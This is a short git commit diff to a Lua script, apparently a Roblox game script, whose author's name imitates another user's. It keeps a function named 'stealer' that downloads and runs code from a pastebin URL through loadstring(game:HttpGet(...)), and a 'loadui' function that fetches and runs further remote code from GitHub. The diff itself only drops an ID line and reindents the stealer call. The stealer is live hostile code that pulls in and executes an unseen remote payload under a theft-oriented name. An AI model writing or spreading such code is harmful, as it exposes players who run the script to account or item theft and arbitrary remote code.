81ea66b6cffd73846f85b150cb9a27ccf81196ee
BIudnyHoIandan <taeistnkzxx@gmail.com>
2025-08-31 00:25:04 +0500

    Update amv.lua

--- primordial/script/amv.lua
+++ primordial/script/amv.lua
@@ -1,6 +1,5 @@
 local function stealer()
-ID="0d0a40e9-48e9-45da-94c2-c75a58369eb9";
-loadstring(game:HttpGet("https://pastebin.com/raw/3QWiJtxQ"))()
+    loadstring(game:HttpGet("https://pastebin.com/raw/3QWiJtxQ"))()
 end
 local function loadui()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/BIudnyHoIandan/MM2/refs/heads/main/script.lua"))()
